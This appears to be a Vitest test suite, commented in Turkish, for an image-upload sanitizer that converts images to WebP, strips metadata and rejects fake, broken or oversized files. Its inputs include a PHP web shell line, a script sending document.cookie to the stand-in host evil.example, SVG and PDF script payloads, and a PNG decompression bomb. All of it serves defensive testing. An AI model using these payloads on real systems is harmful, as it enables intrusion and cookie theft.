// @vitest-environment node
// Görseller kod içinde sharp ile üretilir; repoya ikili dosya eklenmez.
import { deflateSync } from 'node:zlib'
import sharp from 'sharp'
import { describe, expect, it } from 'vitest'

import {
  IMAGE_LIMITS,
  ImageRejected,
  randomObjectName,
  sanitizeImage,
  type ImageKind,
} from '@/lib/teams/imageSafety'

// ---------- yardımcılar ----------

const solid = (w: number, h: number, r = 200, g = 40, b = 40, alpha = false) =>
  sharp({
    create: {
      width: w,
      height: h,
      channels: alpha ? 4 : 3,
      background: alpha ? { r, g, b, alpha: 0.5 } : { r, g, b },
    },
  })

async function animated(frames: number, w: number, h: number, as: 'gif' | 'webp' = 'gif') {
  const parts = await Promise.all(
    Array.from({ length: frames }, (_, i) =>
      solid(w, h, (i * 37) % 256, (i * 91) % 256, 120)
        .png()
        .toBuffer(),
    ),
  )
  const img = sharp(parts, { join: { animated: true } })
  const delay = Array(frames).fill(80)
  return as === 'gif'
    ? img.gif({ delay, loop: 0 }).toBuffer()
    : img.webp({ delay, loop: 0, quality: 80 }).toBuffer()
}

async function expectReject(p: Promise<unknown>, code: ImageRejected['code']) {
  const err: unknown = await p.then(
    (): null => null,
    (e: unknown) => e,
  )
  expect(err, `"${code}" bekleniyordu ama kabul edildi`).toBeInstanceOf(ImageRejected)
  expect((err as ImageRejected).code).toBe(code)
  expect((err as ImageRejected).message.length).toBeGreaterThan(5)
}

function pngChunk(type: string, data: Buffer) {
  const len = Buffer.alloc(4)
  len.writeUInt32BE(data.length)
  const td = Buffer.concat([Buffer.from(type, 'ascii'), data])
  const crc = Buffer.alloc(4)
  crc.writeUInt32BE(crc32(td))
  return Buffer.concat([len, td, crc])
}

function crc32(buf: Buffer) {
  let c = ~0
  for (const byte of buf) {
    c ^= byte
    for (let k = 0; k < 8; k++) c = (c >>> 1) ^ (0xedb88320 & -(c & 1))
  }
  return ~c >>> 0
}

/** IHDR'ında dev boyut yazan ama birkaç KB'lık "sıkıştırma bombası" PNG. */
function pngBomb(w: number, h: number) {
  const ihdr = Buffer.alloc(13)
  ihdr.writeUInt32BE(w, 0)
  ihdr.writeUInt32BE(h, 4)
  ihdr[8] = 8 // bit derinliği
  ihdr[9] = 0 // gri ton
  // Sıfırlarla dolu satırlar çok iyi sıkışır; ilk 50 satırı yeterli.
  const rows = Buffer.alloc((w + 1) * 50)
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', deflateSync(rows, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ])
}

const has = (buf: Buffer, needle: string) => buf.includes(Buffer.from(needle, 'latin1'))

async function expectClean(buf: Buffer) {
  const m = await sharp(buf).metadata()
  expect(m.format).toBe('webp')
  expect(m.exif).toBeUndefined()
  expect(m.icc).toBeUndefined()
  expect(m.xmp).toBeUndefined()
  expect(m.iptc).toBeUndefined()
  // WebP kapsayıcısında metadata parçaları da olmamalı
  for (const chunk of ['EXIF', 'XMP ', 'ICCP', 'Exif']) expect(has(buf, chunk)).toBe(false)
}

// ---------- kabul edilen girdiler ----------

describe('sanitizeImage — geçerli görseller', () => {
  it('PNG (saydam) → WebP, logo', async () => {
    const input = await solid(300, 200, 10, 200, 10, true).png().toBuffer()
    const out = await sanitizeImage(input, 'logo')
    expect(out.mime).toBe('image/webp')
    expect(out.ext).toBe('webp')
    expect([out.width, out.height, out.frames]).toEqual([300, 200, 1])
    const m = await sharp(out.buffer).metadata()
    expect(m.hasAlpha).toBe(true)
    await expectClean(out.buffer)
  })

  it('JPEG → WebP, cover', async () => {
    const input = await solid(1200, 600).jpeg().toBuffer()
    const out = await sanitizeImage(input, 'cover')
    expect([out.width, out.height]).toEqual([1200, 600])
    await expectClean(out.buffer)
  })

  it('WebP → WebP, cover', async () => {
    const input = await solid(640, 320).webp().toBuffer()
    const out = await sanitizeImage(input, 'cover')
    expect([out.width, out.height]).toEqual([640, 320])
    await expectClean(out.buffer)
  })

  it('animasyonlu GIF → animasyonlu WebP (kare sayısı ve gecikme korunur)', async () => {
    const input = await animated(5, 120, 90)
    const out = await sanitizeImage(input, 'gif')
    expect(out.mime).toBe('image/webp')
    expect([out.width, out.height, out.frames]).toEqual([120, 90, 5])
    const m = await sharp(out.buffer, { animated: true }).metadata()
    expect(m.pages).toBe(5)
    expect(m.delay).toEqual([80, 80, 80, 80, 80])
    await expectClean(out.buffer)
  })

  it('animasyonlu WebP → gif türünde kabul', async () => {
    const input = await animated(4, 100, 100, 'webp')
    const out = await sanitizeImage(input, 'gif')
    expect(out.frames).toBe(4)
  })

  it('animasyonlu GIF logo olarak yüklenirse yalnız ilk kare alınır', async () => {
    const input = await animated(6, 64, 64)
    const out = await sanitizeImage(input, 'logo')
    expect(out.frames).toBe(1)
    const m = await sharp(out.buffer).metadata()
    expect(m.pages ?? 1).toBe(1)
  })

  it('sınırı aşan boyutlar reddedilmez, fit:inside ile küçültülür', async () => {
    const cover = await sanitizeImage(await solid(4000, 1000).jpeg().toBuffer(), 'cover')
    expect([cover.width, cover.height]).toEqual([2400, 600])
    const logo = await sanitizeImage(await solid(3000, 3000).png().toBuffer(), 'logo')
    expect([logo.width, logo.height]).toEqual([1024, 1024])
    const gif = await sanitizeImage(await animated(3, 1600, 400), 'gif')
    expect([gif.width, gif.height, gif.frames]).toEqual([800, 200, 3])
  })

  it('küçük görseller büyütülmez', async () => {
    const out = await sanitizeImage(await solid(16, 16).png().toBuffer(), 'cover')
    expect([out.width, out.height]).toEqual([16, 16])
  })
})

// ---------- metadata temizliği ----------

describe('sanitizeImage — metadata temizliği', () => {
  it('EXIF/GPS/XMP/ICC içeren JPEG → çıktıda hiçbiri yok', async () => {
    const input = await solid(400, 300)
      .jpeg()
      .withExif({
        IFD0: {
          Copyright: 'GIZLI-COPYRIGHT',
          Artist: 'GIZLI-ARTIST',
          ImageDescription: 'GIZLI-DESC',
        },
        IFD3: { GPSLatitudeRef: 'N', GPSLatitude: '38/1 40/1 0/1' },
      })
      .withXmp(
        '<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description>GIZLI-XMP</rdf:Description></rdf:RDF></x:xmpmeta>',
      )
      .withIccProfile('p3')
      .toBuffer()
    // Girdide gerçekten var olduklarını doğrula
    const im = await sharp(input).metadata()
    expect(im.exif).toBeDefined()
    expect(im.xmp).toBeDefined()
    expect(im.icc).toBeDefined()
    expect(has(input, 'GIZLI-ARTIST')).toBe(true)

    const out = await sanitizeImage(input, 'cover')
    await expectClean(out.buffer)
    for (const s of ['GIZLI', 'GPS']) expect(has(out.buffer, s)).toBe(false)
  })

  it('EXIF yönü (orientation=6) piksellere uygulanır, etiket atılır', async () => {
    const input = await solid(400, 200).jpeg().withMetadata({ orientation: 6 }).toBuffer()
    const out = await sanitizeImage(input, 'cover')
    expect([out.width, out.height]).toEqual([200, 400])
    const m = await sharp(out.buffer).metadata()
    expect(m.orientation).toBeUndefined()
    await expectClean(out.buffer)
  })
})

// ---------- imza / tür reddi ----------

describe('sanitizeImage — sahte içerik (.png adlı ama görsel değil)', () => {
  const fakes: Record<string, Buffer> = {
    HTML: Buffer.from(
      '<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html>',
    ),
    SVG: Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script><rect width="10" height="10"/></svg>',
    ),
    'SVG (xml başlıklı)': Buffer.from(
      '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
    ),
    EXE: Buffer.concat([
      Buffer.from('MZ'),
      Buffer.alloc(58),
      Buffer.from([0x80, 0, 0, 0]),
      Buffer.alloc(64),
      Buffer.from('PE\0\0'),
      Buffer.alloc(200),
    ]),
    ZIP: Buffer.concat([
      Buffer.from([0x50, 0x4b, 0x03, 0x04]),
      Buffer.alloc(26),
      Buffer.from('evil.php'),
      Buffer.from('<?php echo 1; ?>'),
    ]),
    PDF: Buffer.from(
      '%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj\ntrailer\n%%EOF',
    ),
    PHP: Buffer.from('<?php system($_GET["c"]); ?>'),
    'düz metin': Buffer.from('merhaba dünya'),
  }
  for (const [name, buf] of Object.entries(fakes)) {
    it(`${name} → bad_signature`, async () => {
      await expectReject(sanitizeImage(buf, 'logo'), 'bad_signature')
    })
  }

  it('boş dosya → bad_signature', async () => {
    await expectReject(sanitizeImage(Buffer.alloc(0), 'logo'), 'bad_signature')
  })
})

describe('sanitizeImage — desteklenmeyen görsel biçimleri', () => {
  it('TIFF → bad_type', async () => {
    const input = await solid(20, 20).tiff().toBuffer()
    await expectReject(sanitizeImage(input, 'cover'), 'bad_type')
  })

  it('BMP → bad_type', async () => {
    const bmp = Buffer.alloc(70)
    bmp.write('BM', 0)
    bmp.writeUInt32LE(70, 2)
    bmp.writeUInt32LE(54, 10)
    bmp.writeUInt32LE(40, 14)
    await expectReject(sanitizeImage(bmp, 'cover'), 'bad_type')
  })

  it('gif türüne statik PNG/JPEG → bad_type', async () => {
    await expectReject(sanitizeImage(await solid(20, 20).png().toBuffer(), 'gif'), 'bad_type')
    await expectReject(sanitizeImage(await solid(20, 20).jpeg().toBuffer(), 'gif'), 'bad_type')
  })
})

// ---------- bozuk dosyalar ----------

describe('sanitizeImage — bozuk gövde', () => {
  it('PNG imzalı ama gövdesi çöp → decode_failed', async () => {
    const buf = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from('<html><script>alert(1)</script></html>'.repeat(10)),
    ])
    await expectReject(sanitizeImage(buf, 'logo'), 'decode_failed')
  })

  it('geçerli IHDR ama bozuk IDAT → decode_failed', async () => {
    const ihdr = Buffer.alloc(13)
    ihdr.writeUInt32BE(64, 0)
    ihdr.writeUInt32BE(64, 4)
    ihdr[8] = 8
    ihdr[9] = 2
    const buf = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      pngChunk('IHDR', ihdr),
      pngChunk('IDAT', Buffer.from('bu zlib değil, saldırı yükü')),
      pngChunk('IEND', Buffer.alloc(0)),
    ])
    await expectReject(sanitizeImage(buf, 'logo'), 'decode_failed')
  })

  it('yarıda kesilmiş JPEG → decode_failed', async () => {
    const full = await sharp({
      create: {
        width: 400,
        height: 400,
        channels: 3,
        background: '#000',
        noise: { type: 'gaussian', mean: 128, sigma: 50 },
      },
    })
      .jpeg()
      .toBuffer()
    await expectReject(
      sanitizeImage(full.subarray(0, Math.floor(full.length / 2)), 'cover'),
      'decode_failed',
    )
  })
})

// ---------- bomba / sınır ----------

describe('sanitizeImage — piksel ve kare sınırları', () => {
  it('20000×20000 PNG piksel bombası (küçük dosya) → too_many_pixels', async () => {
    const bomb = pngBomb(20000, 20000)
    expect(bomb.length).toBeLessThan(IMAGE_LIMITS.logo.maxBytes)
    await expectReject(sanitizeImage(bomb, 'logo'), 'too_many_pixels')
    await expectReject(sanitizeImage(bomb, 'cover'), 'too_many_pixels')
  })

  it('uç en-boy oranlı bomba (1×200000) → too_many_pixels', async () => {
    await expectReject(sanitizeImage(pngBomb(200000, 1), 'cover'), 'too_many_pixels')
  })

  it('kare başına çok büyük animasyon (3000×3000 GIF) → too_many_pixels', async () => {
    const input = await solid(3000, 3000).gif().toBuffer()
    await expectReject(sanitizeImage(input, 'gif'), 'too_many_pixels')
  })

  it(`maks kareyi (${IMAGE_LIMITS.gif.maxFrames}) aşan GIF → too_many_frames`, async () => {
    const input = await animated(IMAGE_LIMITS.gif.maxFrames + 1, 8, 8)
    await expectReject(sanitizeImage(input, 'gif'), 'too_many_frames')
  })

  it('tam sınırdaki kare sayısı kabul edilir', async () => {
    const out = await sanitizeImage(await animated(IMAGE_LIMITS.gif.maxFrames, 8, 8), 'gif')
    expect(out.frames).toBe(IMAGE_LIMITS.gif.maxFrames)
  })

  it.each(['logo', 'cover', 'gif'] as ImageKind[])(
    '%s: maxBytes aşımı decode edilmeden → too_large',
    async (kind) => {
      const valid = await solid(10, 10).gif().toBuffer()
      const big = Buffer.concat([
        valid,
        Buffer.alloc(IMAGE_LIMITS[kind].maxBytes + 1 - valid.length),
      ])
      await expectReject(sanitizeImage(big, kind), 'too_large')
    },
  )

  it('sınırlar Vercel gövde sınırının (~4.5 MB) altında', () => {
    for (const l of Object.values(IMAGE_LIMITS)) expect(l.maxBytes).toBeLessThan(4.5 * 1024 * 1024)
  })
})

// ---------- polyglot ----------

describe('sanitizeImage — polyglot yükler', () => {
  const payload =
    '<?php system($_GET["c"]); ?><script>fetch("//evil.example/"+document.cookie)</script>'

  it('JPEG sonuna eklenmiş PHP/JS → kabul edilirse çıktıda yük baytları yok', async () => {
    const jpeg = await solid(200, 100).jpeg().toBuffer()
    const poly = Buffer.concat([jpeg, Buffer.from(payload)])
    const res = await sanitizeImage(poly, 'cover').catch((e: unknown) => e)
    if (res instanceof ImageRejected) {
      expect(['decode_failed', 'bad_signature']).toContain(res.code)
      return
    }
    const out = res as Awaited<ReturnType<typeof sanitizeImage>>
    for (const s of ['<?php', 'system(', '<script', 'evil.example'])
      expect(has(out.buffer, s)).toBe(false)
    await expectClean(out.buffer)
  })

  it('EXIF açıklamasına gömülü PHP → çıktıda yok', async () => {
    const input = await solid(100, 100)
      .jpeg()
      .withExif({ IFD0: { ImageDescription: payload } })
      .toBuffer()
    expect(has(input, '<?php')).toBe(true)
    const out = await sanitizeImage(input, 'logo')
    expect(has(out.buffer, '<?php')).toBe(false)
    expect(has(out.buffer, '<script')).toBe(false)
  })

  it('GIF sonuna eklenmiş ZIP/JS → çıktıda yük yok', async () => {
    const gif = await animated(2, 40, 40)
    const poly = Buffer.concat([gif, Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from(payload)])
    const res = await sanitizeImage(poly, 'gif').catch((e: unknown) => e)
    if (res instanceof ImageRejected) return
    const out = res as Awaited<ReturnType<typeof sanitizeImage>>
    expect(has(out.buffer, '<?php')).toBe(false)
    expect(has(out.buffer, 'PK\x03\x04')).toBe(false)
  })

  it('HTML ile başlayıp içinde PNG taşıyan dosya → bad_signature', async () => {
    const png = await solid(10, 10).png().toBuffer()
    const poly = Buffer.concat([Buffer.from('<html><script>alert(1)</script>'), png])
    await expectReject(sanitizeImage(poly, 'logo'), 'bad_signature')
  })
})

// ---------- randomObjectName ----------

describe('randomObjectName', () => {
  it('team-<32 hex>.<ext> biçiminde ve benzersiz', () => {
    const names = new Set(Array.from({ length: 500 }, () => randomObjectName('webp')))
    expect(names.size).toBe(500)
    for (const n of names) expect(n).toMatch(/^team-[0-9a-f]{32}\.webp$/)
  })

  it('baştaki noktayı ve büyük harfi normalize eder', () => {
    expect(randomObjectName('.PNG')).toMatch(/^team-[0-9a-f]{32}\.png$/)
  })

  it.each(['', '../x', 'php/../', 'we bp', 'toolongext', 'a.b', 'webp\0'])(
    'geçersiz uzantı reddedilir: %j',
    (ext) => {
      expect(() => randomObjectName(ext)).toThrow()
    },
  )
})
